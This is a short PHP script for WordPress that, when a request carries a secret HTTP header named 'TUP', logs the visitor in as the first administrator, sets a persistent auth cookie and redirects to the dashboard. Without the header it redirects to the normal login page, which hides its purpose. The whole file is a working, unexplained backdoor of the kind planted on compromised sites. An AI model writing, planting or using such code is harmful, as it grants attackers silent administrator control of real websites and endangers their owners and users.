<?php

if (!function_exists('getallheaders')) {
    function getallheaders() {
        $headers = [];
        foreach ($_SERVER as $name => $value) {
            if (strpos($name, 'HTTP_') === 0) {
                $key = str_replace('_', '-', substr($name, 5));
                $headers[$key] = $value;
            }
        }
        return $headers;
    }
}

function find_wp_load() {
    $dir = __DIR__;
    while ($dir !== dirname($dir)) {
        if (file_exists($dir . '/wp-load.php')) {
            return $dir . '/wp-load.php';
        }
        $dir = dirname($dir);
    }
    return false;
}

$wp_load_path = find_wp_load();
if (!$wp_load_path) {
    die('Error: wp-load.php not found.');
}

require_once $wp_load_path;

if (empty($_SERVER['HTTP_TUP'])) {
    wp_redirect(wp_login_url());
    exit;
}

if (!function_exists('get_users')) {
    require_once ABSPATH . 'wp-includes/pluggable.php';
}

$admins = get_users([
    'role'    => 'administrator',
    'number'  => 1,
    'orderby' => 'ID',
    'order'   => 'ASC'
]);

if (empty($admins)) {
    wp_die('No administrator found.');
}

$user = $admins[0];

wp_set_current_user($user->ID);
wp_set_auth_cookie($user->ID, true);
do_action('wp_login', $user->user_login, $user);

wp_redirect(admin_url());
exit;